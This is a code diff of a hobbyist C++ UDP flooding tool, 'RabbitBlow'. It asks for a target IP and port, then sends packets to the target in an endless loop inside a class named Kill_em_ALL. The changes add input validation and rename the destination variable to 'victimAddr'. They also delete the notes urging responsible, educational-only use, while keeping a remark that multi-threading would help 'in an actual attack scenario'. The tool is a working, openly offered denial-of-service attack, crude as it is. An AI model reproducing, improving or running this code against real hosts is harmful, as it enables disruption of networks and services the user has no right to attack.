@@ -4,15 +4,15 @@
     @author Mousymous
     
     Created By Mousymous at November 14 2024 - November 16 2024.
-    The whole code is hand written and developed by mousymous so bugs and mistakes are visible.
+    The whole code is hand written and developed so by mousymous so bugs and mistakes are visible.
     You can modify the program to make it even better.
 
     Issues: 
 
         Unfinished missing multi-threading, but it is working. (multi-threading is needed)
         Very weak, needs open UDP ports to work and often causes Low to None damage on a Network.
-        If supplied with incorrect Input, The program will just Kicks you out or cause undefined behaviours.
-        Error messages aren't informative enough so you gotta dig deeper if errors is encountered.
+        If supplied with incorrect Input, The program will just Kicks you out or cause undefined behaviours. (fixed)
+        Error messages aren't informative enough so you gotta dig deeper if errors is encountered. (fixed)
 
         Overall unfinished, unoptimized and Buggy but it works!.
 
@@ -65,90 +65,176 @@
 #include <string.h>
 #include <limits>
 #include <thread>
+#include <boost/asio.hpp>
+#include <cstdint>
 #include "textcolors.h"
 
 #define COLOR REDHB
+#define PORT_LIMIT 65535
 
 // Structure to hold socket information
 struct SocketInfo {
-    int socket; // The socket file descriptor
+    std::int8_t socket; // The socket file descriptor
 };
 
 // Structure to hold user-inputted target data (IP address and port)
 struct StoredData {
     std::string targetIpAddress; // Target IP address to connect to
-    int targetPortNumber; // Target port number to connect to
+    std::uint16_t targetPortNumber; // Target port number to connect to
 };
 
 // Class to display the logo of the tool
 class DisplayLogo {
     public:
         // Constructor that takes the tool's name as an argument
-        DisplayLogo(const std::string& toolName) {
-            DisplayToolName(toolName); // Calls the DisplayToolName method to display the tool's name
-        }
-    
-        // Method to display the tool's name
-        void DisplayToolName(const std::string& toolName) {
-            std::cout << toolName; // Outputs the tool's name
+        DisplayLogo(const std::string& rabbitBlowLogo) {
+            std::cout << rabbitBlowLogo << std::endl;
         }
 };
 
-// Class to handle user input for the target IP address and port
-class UserInput {
+// Class to take user input and validates if it's valid
+class GetUserInput {
+
     public:
-        // Constructor to initialize and get user input
-        UserInput(struct StoredData& storedDataObj) {
-            getUserInput(storedDataObj); // Calls the getUserInput method to get the target IP and port
+
+        // Constructor that will execute the function that will fetch user inputs
+
+        GetUserInput(struct StoredData& storedDataObj) {
+            fetchUserInput(storedDataObj); 
         };
 
-        // Checks if the input is valid
-        void checkValidInput() {
-            if (std::cin.fail()) { // If there is an input failure
-                std::cerr << BRED "Invalid Input!!"; // Display error message in red
-                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n'); // Clear the input buffer
-                std::cin.clear(); // Reset the input stream state
-                exit(EXIT_FAILURE); // Exit the program with failure status
-            }
+    private:
+
+        // Structure to stores temporary IP Address and PORT Number inputs from user for checking validation.
+    
+        struct StoredInput {
+
+            std::string inputipAddress;
+            std::uint16_t inputPortNumber; // uses int type std::uint16_t because unsigned short 16 bit int contains the exact numbers of available ports
+
+        };
+
+        // Enumerate machine state, which stores each state checkValidInput() function will be in upon input validation
+        // why add this feature? so in future changes it's more easier to add states whenever new inputs will be added
+
+        typedef enum {
+
+            IP_ADDRESS_STATE,
+            PORT_NUMBER_STATE
+
+        } InputState;
+
+
+        // checkValidInput() function checks whenever given input is valid
+        // it also takes 2 parameters which the first one is checking the state and
+        // the other for accessing the stored input from the StoredInput structure
+
+        void checkValidInput(InputState& inputState_IS, struct StoredInput& storedInput) {
+
+            // This switch-case statement checks which state this function will be in, whenever checking the IP address or Port number?
+
+           switch(inputState_IS) {
+
+                case (IP_ADDRESS_STATE):
+
+                     // This State Checks if the given IP Address is Valid, Because the IP address is a string. i used a
+                     // boost::asio::ip::address::from_string() predefined function from boost header (which is not a standard header of C++)
+                     // to check it, remember to compile it with -lboost_system to work    
+
+                    try {
+        
+                        boost::asio::ip::address::from_string(storedInput.inputipAddress);
+
+                    } catch (boost::system::system_error&) {
+
+                        std::cerr << COLOR "IP ADDRESS IS INVALID CHILL TYPE SLOW OR MAYBE YOU're TARGET DOESNT EXIST?" reset;
+                        exit(EXIT_FAILURE);
+                        break;
+                    }
+
+                case (PORT_NUMBER_STATE):
+
+                    // This state checks if the given PORT number is valid.
+                    // One is for checking if the given input is a number.
+                    // Second is for checking if the input is less than 0 (because using 0 as a port is invalid) 
+                    // and if the port number is greater than PORT_LIMIT (conatins 65535 because this is ho many the ports in our mordern system)
+
+
+                    if (std::cin.fail()) {
+
+                         // Checks if PORT Number is a Number !
+                        std::cerr << COLOR "YOU MORON THAT'S NOT A PORT NUMBER WHAT ARE YOU A SKID?" reset << std::endl;
+                        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+                        std::cin.clear();
+                        exit(EXIT_FAILURE);
+                    }
+
+                    if (storedInput.inputPortNumber < 0 || storedInput.inputPortNumber > PORT_LIMIT){
+                        
+                        // Checks if PORT Number is in right radius!
+ 
+                        std::cerr << COLOR "STUDY COMPUTER NETWORKING KIDDO, THAT IS NOT A PORT NUMBER!" reset << std::endl;
+                        exit(EXIT_FAILURE);
+                        break;
+                    }
+           }
         }
 
-        // Prompts the user to enter the target port number
-        int getPortTarget() {
-            int input { 0 };
-            std::cout << COLOR "Enter Target Port Number: " reset; // Displays the prompt
-            std::cin >> input; 
-            std::cin.ignore(); // Clears any extra input
-            checkValidInput(); // Validates the input
-            return input; // Returns the user input for port number
+
+        // getIpTarget() now have 2 parameters, one for passing the machine state and other 
+        // for the structure that stores the temporary user input
+        // also it prompts the user to enter target IP Address
+
+        std::string getIpTarget(InputState inputState_IP, struct StoredInput& storedInput) { 
+
+            std::cout << COLOR "Enter Target IP: " reset;
+            std::getline(std::cin, storedInput.inputipAddress);
+            checkValidInput(inputState_IP, storedInput); 
+
+            return storedInput.inputipAddress; 
         }
 
-        // Prompts the user to enter the target IP address
-        std::string getIpTarget() {
-            std::string input{ "" };
-            std::cout << COLOR "Enter Target IP: " reset; // Displays the prompt
-            std::getline(std::cin, input); // Reads the full line of input
-            checkValidInput(); // Validates the input
-            return input; // Returns the user input for IP address
+
+        // getPortNumber() also have 2 parameter one for passing the machine state and other 
+        // for the structure that stores the temporary user input
+        // Also prompts the user to enter the target port number
+
+        int getPortTarget(InputState inputState_Port, struct StoredInput& storedInput) {
+
+            std::cout << COLOR "Enter Target Port Number: " reset; 
+            std::cin >> storedInput.inputPortNumber; 
+            std::cin.ignore();
+
+            checkValidInput(inputState_Port, storedInput);
+
+            return storedInput.inputPortNumber;
         }
 
         // Method to get both the target IP address and port number from the user
-        void getUserInput(struct StoredData& storedDataObj) {
-            storedDataObj.targetIpAddress = getIpTarget(); // Sets the IP address
-            storedDataObj.targetPortNumber = getPortTarget(); // Sets the port number
+        // and passes the state on each respective function and also supplies the functions an access to
+        // the StoredData structure
+        void fetchUserInput(struct StoredData& storedDataObj) {
+
+            struct StoredInput storedInput = { "" , 0 };
+
+            storedDataObj.targetIpAddress = getIpTarget(IP_ADDRESS_STATE, storedInput); 
+            storedDataObj.targetPortNumber = getPortTarget(PORT_NUMBER_STATE, storedInput);
         }
 };
+
+
 
 // Class to configure the socket and prepare it for communication
 class SocketConfig {
     public:
         // Constructor that initializes the socket and binds it to the target IP and port
-        SocketConfig(struct SocketInfo& socketInfoObj, struct sockaddr_in& servaddr, struct StoredData& storedDataObj) {
+        SocketConfig(struct SocketInfo& socketInfoObj, struct sockaddr_in& victimAddr, struct StoredData& storedDataObj) {
             socketInitialization(socketInfoObj.socket); // Calls socket initialization
-            socketBind(servaddr, storedDataObj); // Binds the socket to the target IP and port
+            socketBind(victimAddr, storedDataObj); // Binds the socket to the target IP and port
         }
 
         // Initializes the socket for communication
-        void socketInitialization(int& sockfd) {
+        void socketInitialization(int8_t& sockfd) {
             if ( (sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0 ) {
                 std::cerr << BRED "Socket failed to initialize" << std::endl; // Displays error if socket creation fails
                 exit(EXIT_FAILURE); // Exit program with failure
@@ -156,13 +242,13 @@ class SocketConfig {
         }
 
         // Binds the socket to the target IP address and port number
-        void socketBind(struct sockaddr_in& servaddr, struct StoredData& storedDataObj) {
-            memset(&servaddr, 0, sizeof(servaddr)); // Clears memory for sockaddr_in structure
-            servaddr.sin_family = AF_INET; // Sets the socket family to IPv4
-            servaddr.sin_port = htons(static_cast<uint16_t>(storedDataObj.targetPortNumber)); // Sets the target port (converted to network byte order)
+        void socketBind(struct sockaddr_in& victimAddr, struct StoredData& storedDataObj) {
+            memset(&victimAddr, 0, sizeof(victimAddr)); // Clears memory for sockaddr_in structure
+            victimAddr.sin_family = AF_INET; // Sets the socket family to IPv4
+            victimAddr.sin_port = htons(static_cast<uint16_t>(storedDataObj.targetPortNumber)); // Sets the target port (converted to network byte order)
 
             // Converts the target IP address from text to binary format
-            if(inet_pton(AF_INET, storedDataObj.targetIpAddress.c_str(), &servaddr.sin_addr) <= 0) {
+            if(inet_pton(AF_INET, storedDataObj.targetIpAddress.c_str(), &victimAddr.sin_addr) <= 0) {
                 std::cerr << BRED "Invalid IP Address Format" << std::endl; // Error if IP format is invalid
                 exit(EXIT_FAILURE); // Exit the program with failure
             }
@@ -179,18 +265,18 @@ class SocketConfig {
 class Kill_em_ALL {
     public:
         // Constructor that starts the destructive operation
-        Kill_em_ALL(struct SocketInfo& sockInfoObj, struct sockaddr_in& servaddr) {
-            DESTROY(sockInfoObj, servaddr); // Calls the DESTROY method to initiate the attack
+        Kill_em_ALL(struct SocketInfo& sockInfoObj, struct sockaddr_in& victimAddr) {
+            DESTROY(sockInfoObj, victimAddr); // Calls the DESTROY method to initiate the attack
         }
         
         // Method to send destructive packets to the target continuously
-        void DESTROY(struct SocketInfo& sockInfoObj, struct sockaddr_in& servaddr) {    
+        void DESTROY(struct SocketInfo& sockInfoObj, struct sockaddr_in& victimAddr) {    
             std::string data_to_transfer = "RABITS ARE INVADING THEY ARE ATTACKING YOUR NETWORK!!!!!!"; // Message to send
 
             while (true) {
                 // Sends the message to the target IP and port
                 ssize_t byteSent = sendto(sockInfoObj.socket, data_to_transfer.c_str(), data_to_transfer.size(), 0,
-                                          (struct sockaddr *)&servaddr, sizeof(servaddr));
+                                          (struct sockaddr *)&victimAddr, sizeof(victimAddr));
 
                 if (byteSent < 0) { // If message sending fails
                     std::cerr << BRED "Failed to send message! Error: " << strerror(errno) << std::endl; // Error message
@@ -208,24 +294,25 @@ class Kill_em_ALL {
 
 // Main function to start the program
 int main([[maybe_unused]]int argc, [[maybe_unused]] char **argv) {
-    extern const std::string toolName; // External variable for the tool name
 
-    struct sockaddr_in servaddr; // Address structure for the target
+    extern const std::string rabbitBlowLogo; // External variable for the tool name
+
+    struct sockaddr_in victimAddr; // Address structure for the target
 
     struct SocketInfo socketInfoObj = { 0 }; // Initializes the socket info structure
     struct StoredData storedDataObj = { " " , 0 }; // Initializes the stored data structure with default values
 
     // Display tool name (logo)
-    DisplayLogo displayLogoObj(toolName); 
+    DisplayLogo displayLogoObj(rabbitBlowLogo); 
 
     // Get user input for target IP and port
-    UserInput userInputObj(storedDataObj); 
+    GetUserInput getUserInputObj(storedDataObj); 
 
     // Configure the socket for communication
-    SocketConfig socketConfigObj(socketInfoObj, servaddr, storedDataObj); 
+    SocketConfig socketConfigObj(socketInfoObj, victimAddr, storedDataObj); 
 
     // Start the destructive operation
-    Kill_em_ALL(socketInfoObj, servaddr);
+    Kill_em_ALL(socketInfoObj, victimAddr);
 
     return EXIT_SUCCESS; // Exit the program with success
 }
@@ -239,22 +326,29 @@ int main([[maybe_unused]]int argc, [[maybe_unused]] char **argv) {
 
        - The program starts by displaying the name of the tool (or logo) using the `DisplayLogo` class. The logo is displayed via the `DisplayToolName()` method in this class, which outputs the tool name to the console.
 
-    User Input (Target IP and Port:
+
+    User Input (Target IP and Port):
 
        - The `UserInput` class handles collecting the target IP address and port number from the user. The constructor calls the `getUserInput()` method, which internally calls two methods:
          - `getIpTarget()`: Asks the user to input the target IP address (e.g., "192.168.1.1").
          - `getPortTarget()`: Asks the user to input the target port number (e.g., "8080").
-       - Both methods ensure that the input is valid by calling `checkValidInput()`. If invalid input is detected (e.g., a non-numeric value when a number is expected), an error message is displayed, and the program exits.
+
+       - Both methods ensure that the input is valid by calling `checkValidInput()`. 
+
+            Checks for valid IP Address.
+            Checks for valid Port Number.
 
     Socket Initialization:
 
 
-       - The `SocketConfig` class is responsible for setting up the network socket. The constructor of this class initializes the socket using the `socketInitialization()` method, which calls the system call `socket()` to create a UDP socket.
+       - The `SocketConfig` class is responsible for setting up the network socket. The constructor of this class initializes the socket using the 
+        `socketInitialization()` method, which calls the system call `socket()` to create a UDP socket.
        - If socket creation fails, an error message is displayed, and the program exits. The `socket()` function is used here to set up a socket for **UDP communication** (`SOCK_DGRAM`).
 
     Binding the Socket:
 
-       - After the socket is created, the `socketBind()` method configures the socket with the target IP address and port. It uses the `inet_pton()` function to convert the target IP address from text to binary format (network byte order).
+       - After the socket is created, the `socketBind()` method configures the socket with the target IP address and port. It uses the `inet_pton()` 
+        function to convert the target IP address from text to binary format (network byte order).
        - The `htons()` function is used to convert the target port number into the proper network byte order.
        - The socket is not explicitly bound to a local address since this is a **client-side operation**, and binding is unnecessary for UDP in this case.
 
@@ -263,7 +357,8 @@ int main([[maybe_unused]]int argc, [[maybe_unused]] char **argv) {
 
        - The `Kill_em_ALL` class simulates a **denial-of-service (DoS) attack** by continuously sending UDP packets to the target using the `sendto()` system call.
        - The attack message `"RABITS ARE INVADING THEY ARE ATTACKING YOUR NETWORK!!!!!!"` is sent in each UDP packet.
-       - The `DESTROY()` method continuously loops, sending the packet to the target address (`servaddr`) using the socket created earlier. If sending the packet fails (e.g., due to a network error), an error message is displayed, and the socket is closed.
+       - The `DESTROY()` method continuously loops, sending the packet to the target address (`victimAddr`) using the socket created earlier. If sending the packet
+         fails (e.g., due to a network error), an error message is displayed, and the socket is closed.
        - The loop continues indefinitely, sending the message and printing progress output to the console. The message simulates an attack with some playful text (e.g., "ThE RaBBiTs ArE On To BrEaK ThE SyStEm!").
 
     Program Execution Flow:
@@ -281,7 +376,7 @@ int main([[maybe_unused]]int argc, [[maybe_unused]] char **argv) {
 
     Things to Remember:
 
-    - The program is an example for understanding socket programming and how data can be sent over a network. **It is important to use this knowledge responsibly** and not for any malicious activity.
-    - The program lacks **multi-threading** support for sending multiple instances of the message concurrently, which could improve performance in an actual attack scenario. For learning, this simple version can be further extended with threading or other features.
-    - It is important to highlight that this is not a real DoS attack, and the code should only be run in a controlled and ethical environment for educational purposes.
+    - The program is an example for understanding socket programming and how data can be sent over a network.
+    - The program lacks **multi-threading** support for sending multiple instances of the message concurrently,
+      which could improve performance in an actual attack scenario. For learning, this simple version can be further extended with threading or other features.
 */
